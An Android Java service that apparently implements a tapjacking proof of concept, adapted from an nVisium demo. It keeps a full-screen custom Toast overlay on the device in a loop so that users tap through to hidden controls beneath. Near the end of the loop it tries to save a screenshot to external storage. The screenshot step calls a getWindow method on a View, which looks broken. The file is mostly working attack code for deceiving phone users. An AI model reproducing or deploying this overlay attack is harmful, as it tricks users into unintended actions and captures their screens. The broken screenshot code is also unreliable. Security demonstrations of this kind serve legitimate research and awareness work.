package com.test.www.navigationtest;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Date;

public class TapjackingService extends Service {
    View view;
    @Override
    public IBinder onBind(Intent intent) {

        return null;
    }

    @Override
    public void onCreate() {

        super.onCreate();
        LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        // create first toast
        Toast toast = Toast.makeText(getApplicationContext(), "",
                Toast.LENGTH_SHORT);
        view = inflater.inflate(R.layout.destination_layout, null);

        toast.setView(view);
        toast.setGravity(Gravity.FILL, 100, 100);

        fireLongToast(toast);
        //launchMarket();
    }

    // this link helped:
    // http://thinkandroid.wordpress.com/2010/02/19/indefinite-toast-hack/
    private void fireLongToast(final Toast toast) {

        Thread t = new Thread() {
            public void run() {
                int count = 0;
                int max_count = 10;
                try {
                    while (true && count < max_count) {

                        toast.show();
						/*
						 * We check to see when we are going to give the screen
						 * back. Right before our toasts end we swap activities
						 * to remove any visual clues
						 */
                        if (count == max_count - 1) {
//                            ComponentName toLaunch;
//                            toLaunch = new ComponentName(
//                                    "com.nvisium.tapjacking",
//                                    "com.nvisium.tapjacking.Main");
//                            Intent intent = new Intent();
//                            intent.addCategory(Intent.CATEGORY_LAUNCHER);
//                            intent.setComponent(toLaunch);
//                            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                            getApplication().startActivity(intent);
                    Date now = new Date();
                    android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", now);

                    try {
                        // image naming and path  to include sd card  appending name you choose for file
                        String mPath = Environment.getExternalStorageDirectory().toString() + "/" + now + ".jpg";

                        // create bitmap screen capture
                        View v1 = view.getWindow().getDecorView().getRootView();
                        v1.setDrawingCacheEnabled(true);
                        Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
                        v1.setDrawingCacheEnabled(false);

                        File imageFile = new File(mPath);

                        FileOutputStream outputStream = new FileOutputStream(imageFile);
                        int quality = 100;
                        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
                        outputStream.flush();
                        outputStream.close();
                    } catch (Throwable e) {
                        // Several error may come out with file handling or OOM
                        e.printStackTrace();
                    }

                        }

						/*
						 * this short sleep helps our toasts transition
						 * seamlessly
						 */
                        sleep(1850);
                        count++;
                    }
                } catch (Exception e) {
                }

                stopSelf();

            }
        };
        t.start();
    }

    private void launchMarket() {

        Thread t = new Thread() {
            public void run() {
				/*
				 * We sleep first in order for the toasts to consume the screen
				 * before the dialer activity launches
				 */
                try {
                    sleep(2000);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.setData(Uri
                        .parse("market://details?id=com.nvisium.tapjackingdemo.installer"));
                getApplication().startActivity(intent);
            }
        };
        t.start();
    }
}
